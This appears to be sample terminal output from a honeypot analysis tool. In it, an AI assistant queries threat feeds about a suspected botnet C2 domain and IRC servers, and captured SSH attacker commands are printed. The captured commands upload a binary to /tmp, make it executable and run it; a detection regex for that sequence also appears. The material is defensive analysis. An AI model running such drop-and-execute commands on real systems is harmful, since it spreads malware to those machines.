Current questions:
{}

Choices:
 a) Ask questions
 e) Enter a question
 u) Upload multiline question from file
 c) Clear questions
 m) Change OpenAI model. (Current model: gpt-4-1106-preview)
 p) Print attack attributes
 q) Quit and continue main

Enter choice (a, e, u, c, m, p OR q): e
Enter question: what do OSINT sources show about the C2 servers?
Enter question key or leave empty to use 'question_4' : 

AI Interactive Chat
Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 9, SSH: 9, Commands: 3, Cmdlogs: 4, Malware: 3 

Current questions:
{'question_4': 'what do OSINT sources show about the C2 servers?'}

Choices:
 a) Ask questions
 e) Enter a question
 u) Upload multiline question from file
 c) Clear questions
 m) Change OpenAI model. (Current model: gpt-4-1106-preview)
 p) Print attack attributes
 q) Quit and continue main

Enter choice (a, e, u, c, m, p OR q): a


Asking: what do OSINT sources show about the C2 servers?
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_aB5ce7XNanjB7EH4ono09N1m
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_aB5ce7XNanjB7EH4ono09N1m
Waiting 5 seconds for response
Status: requires_action Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_aB5ce7XNanjB7EH4ono09N1m

AI called tool: query_ioc_data
with args: {'ioc_type': 'domain', 'iocs': ['bins.deutschland-zahlung.eu'], 'sources': ['threatfox', 'urlhaus']}
Getting data for bins.deutschland-zahlung.eu from threatfox
Getting data for bins.deutschland-zahlung.eu from urlhaus

Submitting tool output: {'bins.deutschland-zahlung.eu': {'threatfox': '', 'urlhaus': ''}}

AI called tool: query_ioc_data
with args: {'ioc_type': 'domain', 'iocs': ['ix1.undernet.org', 'ix2.undernet.org', 'Ashburn.Va.Us.UnderNet.org', 'Bucharest.RO.EU.Undernet.Org', 'Budapest.HU.EU.UnderNet.org', 'Chicago.IL.US.Undernet.org'], 'sources': ['threatfox', 'urlhaus']}
Getting data for ix1.undernet.org from threatfox
Getting data for ix1.undernet.org from urlhaus
Getting data for ix2.undernet.org from threatfox
Getting data for ix2.undernet.org from urlhaus
Getting data for Ashburn.Va.Us.UnderNet.org from threatfox
Getting data for Ashburn.Va.Us.UnderNet.org from urlhaus
Getting data for Bucharest.RO.EU.Undernet.Org from threatfox
Getting data for Bucharest.RO.EU.Undernet.Org from urlhaus
Getting data for Budapest.HU.EU.UnderNet.org from threatfox
Getting data for Budapest.HU.EU.UnderNet.org from urlhaus
Getting data for Chicago.IL.US.Undernet.org from threatfox
Getting data for Chicago.IL.US.Undernet.org from urlhaus

Submitting tool output: {'ix1.undernet.org': {'threatfox': '', 'urlhaus': ''}, 'ix2.undernet.org': {'threatfox': '', 'urlhaus': ''}, 'Ashburn.Va.Us.UnderNet.org': {'threatfox': '', 'urlhaus': ''}, 'Bucharest.RO.EU.Undernet.Org': {'threatfox': '', 'urlhaus': ''}, 'Budapest.HU.EU.UnderNet.org': {'threatfox': '', 'urlhaus': ''}, 'Chicago.IL.US.Undernet.org': {'threatfox': '', 'urlhaus': ''}}
Status: queued Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_aB5ce7XNanjB7EH4ono09N1m
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_aB5ce7XNanjB7EH4ono09N1m
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_aB5ce7XNanjB7EH4ono09N1m
Waiting 5 seconds for response
Status: completed Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_aB5ce7XNanjB7EH4ono09N1m
Run run_aB5ce7XNanjB7EH4ono09N1m completed
Done asst_yJ9SbR6g98zbMTwfXQHmvrcH, thread_jvn8wwUTULdr6Oczn7NhtRXc, run_aB5ce7XNanjB7EH4ono09N1m

 Done with: what do OSINT sources show about the C2 servers?
Answer: The OSINT sources queried, ThreatFox and URLhaus, did not return any data for the domain `bins.deutschland-zahlung.eu` or the IRC server hostnames:

- `ix1.undernet.org`
- `ix2.undernet.org`
- `Ashburn.Va.Us.UnderNet.org`
- `Bucharest.RO.EU.Undernet.Org`
- `Budapest.HU.EU.UnderNet.org`
- `Chicago.IL.US.Undernet.org`

This lack of information suggests that either these domains are not recognized as part of any known threat intelligence feeds in ThreatFox and URLhaus, or they have not been reported or cataloged in relation to malicious activities in these databases.

It could be that the domain `bins.deutschland-zahlung.eu` is an internal indicator within the attacker's infrastructure or part of a less widespread campaign that hasn't been broadly detected. The Undernet IRC servers are legitimate servers likely used by the malware for command and control; their legitimate nature may explain the lack of listings in threat intelligence feeds that typically focus on malicious domains.

AI Interactive Chat
Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 9, SSH: 9, Commands: 3, Cmdlogs: 4, Malware: 3 

Current questions:
{}

Choices:
 a) Ask questions
 e) Enter a question
 u) Upload multiline question from file
 c) Clear questions
 m) Change OpenAI model. (Current model: gpt-4-1106-preview)
 p) Print attack attributes
 q) Quit and continue main

Enter choice (a, e, u, c, m, p OR q): q                              
Finished chatting about attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c with OpenAI Assistant
Writing chat markdown run steps for attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c to /Users/lucasfaudman/Documents/SANS/testenv/attacks/10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c/ai-chat/question_1-question_4run-steps.md
Finished writing chat markdown run steps for attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c to /Users/lucasfaudman/Documents/SANS/testenv/attacks/10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c/ai-chat/question_1-question_4run-steps.md
Honeypot AI Finished Successfully!
    """,
    


    "interactive": """
lucasfaudman@Lucass-MacBook-Pro testenv % honeypot-ai/run.sh -lfa --only-attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c --interact
Starting honeypot-ai...

Loading attacks from attacks directory at /Users/lucasfaudman/Documents/SANS/testenv/attacks
Loading Attack: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x113c0f550>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x113b28cd0>
Loaded Attack: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
(3->3) - Removed 0 attacks with ips ['216.243.47.166', '172.31.5.68', '54.67.87.80']
Attempting merge 18: 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 <- b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f by malware_urls
Merged 0 attacks by out of 18 attempts (0.0000%) 
Merge Attacks Time: 0.0028s
(3->3) - Merged 0 attacks with shared attrs
Regex merged 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \\+x [\\w\\d]+ && bash -c ./[\\w\\d]+')
Regex merged b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \\+x [\\w\\d]+ && bash -c ./[\\w\\d]+')
(3->1) - Merged 2 attacks with shared sig regexes
Entering interactive mode (python shell)...

1 attacks are loaded into the 'ATTACKS' dict and 'ATTACKS_LIST' variables)
Attack attributes can be accessed via 'ATTACKS[ATTACK_ID].ATTR_NAME' or 'ATTACKS_LIST[ATTACK_INDEX].ATTR_NAME'Use dir(ATTACKS_LIST[0]) to see available Attack attr names and functions.
Use 'exit()' or type CTRL-D to exit interactive mode
>>> attack0 = ATTACKS_LIST[0]
>>> attack0
Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 9, SSH: 9, Commands: 3, Cmdlogs: 4, Malware: 3 
>>> attack0.split_commands
['scp -t /tmp/BUwTrLEj', 'cd /tmp && chmod +x BUwTrLEj && bash -c ./BUwTrLEj', './BUwTrLEj']
>>> attack0.sessions[0]
Session 76647820c016 SSH 93.223.169.159:46966 -> 172.31.5.68:2222 Duration: 0.35s
>>> attack0.sessions[0].start_time
datetime.datetime(2024, 1, 26, 21, 59, 42, 976396)
>>> attack0.commands.append("some modification")
>>> attack0.commands
['scp -t /tmp/BUwTrLEj', 'cd /tmp && chmod +x BUwTrLEj && bash -c ./BUwTrLEj', './BUwTrLEj', 'some modification']
>>> ^D
Exiting interactive mode and continuing honeypot-ai...
Honeypot AI Finished Successfully!
    """,
    


    "config_update": """
lucasfaudman@Lucass-MacBook-Pro testenv % honeypot-ai/run.sh --config config.json --update-config --openai-model gpt-4-1106-preview
Starting honeypot-ai...

Updated config file at config.json
No attack loading method specified. Use (-lfl/--load-from-logs) OR (-lfa/--load-from-attacks-dir)    
    """,
    
        
}
